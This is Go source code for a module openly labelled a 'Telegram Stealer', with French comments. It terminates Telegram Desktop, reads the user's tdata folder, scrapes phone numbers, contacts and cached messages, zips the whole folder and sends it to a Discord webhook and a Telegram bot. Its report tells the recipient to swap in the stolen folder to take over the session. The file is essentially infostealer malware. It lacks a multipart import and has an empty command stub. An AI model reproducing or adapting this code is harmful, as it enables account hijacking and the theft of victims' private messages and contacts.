package telegram

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

type TelegramSession struct {
	UserID    int64  `json:"user_id"`
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Username  string `json:"username"`
	Phone     string `json:"phone"`
	Token     string `json:"token"`
	DataPath  string `json:"data_path"`
}

type TelegramContact struct {
	Phone string `json:"phone"`
	Name  string `json:"name"`
	ID    int64  `json:"id"`
}

type TelegramMessage struct {
	Sender   string `json:"sender"`
	Receiver string `json:"receiver"`
	Content  string `json:"content"`
	Time     string `json:"time"`
}

func Run(config map[string]interface{}) {
	webhook := config["webhook"].(string)
	telegramConfig := config["telegram"].(map[string]string)

	sendStatus(webhook, telegramConfig, "telegram", "📱 Telegram Stealer Started", "Initializing Telegram session stealing...")

	killTelegram()

	tdataPath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
	if _, err := os.Stat(tdataPath); os.IsNotExist(err) {
		sendStatus(webhook, telegramConfig, "telegram", "❌ Telegram Not Found", "Telegram Desktop not installed")
		return
	}

	sendStatus(webhook, telegramConfig, "telegram", "📁 TData Found", "Telegram tdata folder located")

	// 1. Vol des sessions
	sessions := extractSessions(tdataPath)
	if len(sessions) == 0 {
		sendStatus(webhook, telegramConfig, "telegram", "⚠️ No Sessions Found", "No active Telegram sessions found")
	} else {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("✅ %d Sessions Found", len(sessions)), fmt.Sprintf("Found %d Telegram sessions", len(sessions)))
	}

	// 2. Vol des numéros de téléphone
	phones := extractPhones(tdataPath)
	if len(phones) > 0 {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("📱 %d Phones Found", len(phones)), fmt.Sprintf("Found %d phone numbers", len(phones)))
	}

	// 3. Vol des contacts
	contacts := stealContacts(tdataPath)
	if len(contacts) > 0 {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("👥 %d Contacts Found", len(contacts)), fmt.Sprintf("Found %d Telegram contacts", len(contacts)))
	}

	// 4. Vol des messages récents
	messages := stealRecentMessages(tdataPath)
	if len(messages) > 0 {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("💬 %d Messages Found", len(messages)), fmt.Sprintf("Found %d recent messages", len(messages)))
	}

	// 5. ZIP complet du dossier tdata
	zipPath := createFullTDataZip(tdataPath)
	if zipPath != "" {
		sendStatus(webhook, telegramConfig, "telegram", "📦 Full TData Archived", "Telegram tdata folder compressed")
		sendFile(webhook, telegramConfig, zipPath)
		os.Remove(zipPath)
	}

	// 6. Envoi des informations
	sessionInfo := formatCompleteInfo(sessions, phones, contacts, messages)
	sendMessage(webhook, telegramConfig, sessionInfo)

	sendStatus(webhook, telegramConfig, "telegram", "✅ Telegram Stealer Complete", "Telegram session stealing finished")
}

func killTelegram() {
	commands := []string{
		"taskkill /F /IM telegram.exe",
		"taskkill /F /IM telegram desktop.exe",
	}
	for _, cmd := range commands {
		execCmd(cmd)
	}
	time.Sleep(2 * time.Second)
}

func extractSessions(tdataPath string) []TelegramSession {
	var sessions []TelegramSession

	files, _ := ioutil.ReadDir(tdataPath)
	for _, file := range files {
		name := file.Name()
		if strings.HasPrefix(name, "D") && len(name) >= 8 {
			session := TelegramSession{
				DataPath: filepath.Join(tdataPath, name),
			}
			sessions = append(sessions, session)
		}
		if strings.HasSuffix(name, ".sess") {
			session := TelegramSession{
				DataPath: filepath.Join(tdataPath, name),
			}
			sessions = append(sessions, session)
		}
	}
	return sessions
}

func extractPhones(tdataPath string) []string {
	var phones []string
	phoneRegex := regexp.MustCompile(`\+\d{10,15}`)

	files, _ := ioutil.ReadDir(tdataPath)
	for _, file := range files {
		if file.IsDir() {
			continue
		}
		if strings.HasSuffix(file.Name(), ".sess") || strings.HasPrefix(file.Name(), "D") {
			data, err := ioutil.ReadFile(filepath.Join(tdataPath, file.Name()))
			if err == nil {
				matches := phoneRegex.FindAllString(string(data), -1)
				for _, match := range matches {
					if !contains(phones, match) {
						phones = append(phones, match)
					}
				}
			}
		}
	}
	return phones
}

func stealContacts(tdataPath string) []TelegramContact {
	var contacts []TelegramContact
	contactRegex := regexp.MustCompile(`(\+?\d{10,15})`)

	// Les contacts sont souvent dans les fichiers .cache
	cacheFiles, _ := filepath.Glob(filepath.Join(tdataPath, "*.cache"))
	for _, cacheFile := range cacheFiles {
		data, err := ioutil.ReadFile(cacheFile)
		if err == nil {
			matches := contactRegex.FindAllString(string(data), -1)
			for _, match := range matches {
				if !containsContact(contacts, match) {
					contacts = append(contacts, TelegramContact{
						Phone: match,
						Name:  "Unknown",
					})
				}
			}
		}
	}

	return contacts
}

func stealRecentMessages(tdataPath string) []TelegramMessage {
	var messages []TelegramMessage

	// Les messages sont dans les fichiers de cache
	cacheFiles, _ := filepath.Glob(filepath.Join(tdataPath, "*.cache"))
	for _, cacheFile := range cacheFiles {
		data, err := ioutil.ReadFile(cacheFile)
		if err == nil {
			// Rechercher des patterns de messages
			// Format typique : "sender: message content"
			msgRegex := regexp.MustCompile(`([a-zA-Z0-9_]+):\s*(.+?)($|\n)`)
			matches := msgRegex.FindAllStringSubmatch(string(data), -1)
			for _, match := range matches {
				if len(match) >= 3 {
					messages = append(messages, TelegramMessage{
						Sender:   match[1],
						Content:  strings.TrimSpace(match[2]),
						Receiver: "Me",
						Time:     time.Now().Format("15:04:05"),
					})
				}
			}

			// Format alternatif : messages chiffrés (si on peut les déchiffrer)
			// Pour l'instant, on les récupère tels quels
		}
	}

	return messages
}

func createFullTDataZip(tdataPath string) string {
	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("telegram_full_%d.zip", time.Now().Unix()))

	zipFile, err := os.Create(zipPath)
	if err != nil {
		return ""
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	filepath.Walk(tdataPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(tdataPath, path)
		if err != nil {
			return nil
		}

		zipEntry, err := zipWriter.Create("Telegram/tdata/" + relPath)
		if err != nil {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return nil
		}
		defer file.Close()

		io.Copy(zipEntry, file)
		return nil
	})

	return zipPath
}

func formatCompleteInfo(sessions []TelegramSession, phones []string, contacts []TelegramContact, messages []TelegramMessage) string {
	var output string

	output += "📱 TELEGRAM COMPLETE SESSION DUMP\n"
	output += "==================================\n\n"

	// Sessions
	output += "🔑 SESSIONS\n"
	output += "-----------\n\n"
	if len(sessions) == 0 {
		output += "No Telegram sessions found.\n\n"
	} else {
		for i, session := range sessions {
			output += fmt.Sprintf("[Session %d]\n", i+1)
			output += fmt.Sprintf("Path: %s\n", session.DataPath)
			if len(phones) > i && i < len(phones) {
				output += fmt.Sprintf("Phone: %s\n", phones[i])
			}
			output += "\n"
		}
	}

	// Phones
	output += "📱 PHONES\n"
	output += "---------\n\n"
	if len(phones) > 0 {
		for _, phone := range phones {
			output += fmt.Sprintf("- %s\n", phone)
		}
	} else {
		output += "No phones found.\n"
	}
	output += "\n"

	// Contacts
	output += "👥 CONTACTS\n"
	output += "-----------\n\n"
	if len(contacts) > 0 {
		for _, contact := range contacts {
			output += fmt.Sprintf("- %s (%s)\n", contact.Name, contact.Phone)
		}
	} else {
		output += "No contacts found.\n"
	}
	output += "\n"

	// Recent Messages
	output += "💬 RECENT MESSAGES\n"
	output += "-----------------\n\n"
	if len(messages) > 0 {
		for _, msg := range messages {
			output += fmt.Sprintf("[%s] %s -> %s: %s\n", msg.Time, msg.Sender, msg.Receiver, msg.Content)
		}
	} else {
		output += "No recent messages found.\n"
	}
	output += "\n"

	output += "📦 Full TData Folder\n"
	output += "====================\n"
	output += "The complete tdata folder is attached as a ZIP file.\n"
	output += "To use: Replace your tdata folder with this one.\n"

	return output
}

func sendMessage(webhook string, telegramConfig map[string]string, message string) {
	if webhook != "" {
		sendDiscordMessage(webhook, message)
	}
	if telegramConfig["bot"] != "" && telegramConfig["chatid"] != "" {
		sendTelegramMessage(telegramConfig["bot"], telegramConfig["chatid"], message)
	}
}

func sendFile(webhook string, telegramConfig map[string]string, filePath string) {
	if webhook != "" {
		sendDiscordFile(webhook, filePath)
	}
	if telegramConfig["bot"] != "" && telegramConfig["chatid"] != "" {
		sendTelegramFile(telegramConfig["bot"], telegramConfig["chatid"], filePath)
	}
}

func sendStatus(webhook string, telegramConfig map[string]string, step, title, message string) {
	formatted := fmt.Sprintf(
		"**[%s]** `%s`\n`%s`\n`%s`",
		time.Now().Format("15:04:05"),
		title,
		message,
		step,
	)
	sendMessage(webhook, telegramConfig, formatted)
}

func sendDiscordMessage(webhook, message string) {
	payload := map[string]string{"content": message}
	jsonData, _ := json.Marshal(payload)
	http.Post(webhook, "application/json", bytes.NewBuffer(jsonData))
}

func sendDiscordFile(webhook, filePath string) {
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return
	}
	io.Copy(part, file)
	writer.Close()

	http.Post(webhook, writer.FormDataContentType(), body)
}

func sendTelegramMessage(botToken, chatID, message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	payload := map[string]string{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "HTML",
	}
	jsonData, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func sendTelegramFile(botToken, chatID, filePath string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return
	}
	io.Copy(part, file)
	writer.WriteField("chat_id", chatID)
	writer.Close()

	http.Post(url, writer.FormDataContentType(), body)
}

func execCmd(cmd string) {}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func containsContact(contacts []TelegramContact, phone string) bool {
	for _, c := range contacts {
		if c.Phone == phone {
			return true
		}
	}
	return false
}